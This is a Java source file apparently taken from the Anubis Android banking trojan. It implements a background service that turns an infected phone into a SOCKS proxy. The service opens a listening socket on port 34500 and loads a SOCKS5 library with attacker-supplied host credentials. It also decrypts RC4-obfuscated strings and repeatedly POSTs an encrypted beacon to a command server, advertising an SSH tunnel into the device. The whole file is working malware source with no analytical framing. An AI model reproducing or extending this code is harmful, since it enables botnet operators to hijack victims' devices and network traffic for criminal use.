package anubis.bot.myapplication.socks;

import android.app.IntentService;
import android.content.Intent;
import android.os.AsyncTask;
import android.util.Base64;
import android.util.Log;


import java.net.ServerSocket;
import java.net.Socket;
import java.util.concurrent.TimeUnit;

import anubis.bot.myapplication.API.ClassRC4;
import anubis.bot.myapplication.UtilsClass;



public class ServiceForwardingTunel extends IntentService {
    UtilsClass utils = new UtilsClass();
    public ServiceForwardingTunel() {
        super("ServiceForwardingTunel");
    }
    public String str_decrypt(String textDE_C, String key)
    {
        UtilsClass utilsClass = new UtilsClass();
        try
        {
            byte[] data = Base64.decode(textDE_C, Base64.DEFAULT);
            textDE_C = new String(data, "UTF-8");
            byte[] detext = utilsClass.hexStringToByteArray(textDE_C);
            ClassRC4 rcd = new ClassRC4(key.getBytes());
            return  new String(rcd.decrypt(detext));
        }catch (Exception ex){ }
        return "";
    }

    @Override
    protected void onHandleIntent(Intent intent) {

        utils.SetWrite(this,"socks","");

        String host = intent.getStringExtra("host");
        String user = intent.getStringExtra("user");
        String pass = intent.getStringExtra("pass");
        String port = intent.getStringExtra("port");

        Thread thread = new Thread(new Runnable() {
                @Override
                public void run() {
                    try {
                        ServerSocket serverSocket = new ServerSocket(34500);
                          utils.Log("ProxyServer", "Port=" + serverSocket.getLocalPort());
                        while (true) {
                            Socket socket = serverSocket.accept();
                            new Thread(new ServerThread(socket)).start();
                        }
                    }catch (Exception e){
                        utils.Log("PORTERROR","ERROR");
                        e.printStackTrace();
                    }
                }
            });

        thread.start();


        utils.LoadLibSocks5(this, host ,user,pass,port);
        utils.Log("START","START SOCKS");

        while(true){
            try {TimeUnit.MILLISECONDS.sleep(8000);} catch (InterruptedException e) {e.printStackTrace();}

            utils.POST(this, "4", "p=" + utils.trafEnCr(utils.ID_B(this) + "|Working Proxy Server, Connection: ssh -L "+port+":127.0.0.1:"+port+" "+user+"@"+host));

            if(utils.SetRead(this, "socks").equals("stop")){
                try {
                    thread.join();
                }catch (Exception ex){

                }

                stopSelf();
                break;
            }
        }



    }
}
